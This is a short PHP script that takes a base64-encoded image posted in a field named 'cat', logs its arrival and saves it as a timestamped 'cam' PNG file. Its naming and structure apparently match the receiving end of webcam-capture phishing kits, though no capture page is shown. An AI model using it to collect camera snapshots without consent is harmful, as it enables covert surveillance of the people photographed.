<?php

// Verificar si hay datos antes de procesar
if (empty($_POST['cat'])) {
    exit(); // Salir si no hay imagen
}

$date = date('dMYHis');
$imageData = $_POST['cat'];

error_log("Received" . "\r\n", 3, "Log.log");

// Ahora es seguro usar $imageData porque ya verificamos que existe
$filteredData = substr($imageData, strpos($imageData, ",") + 1);
$unencodedData = base64_decode($filteredData);

$fp = fopen('cam' . $date . '.png', 'wb');
fwrite($fp, $unencodedData);
fclose($fp);

exit();
?>
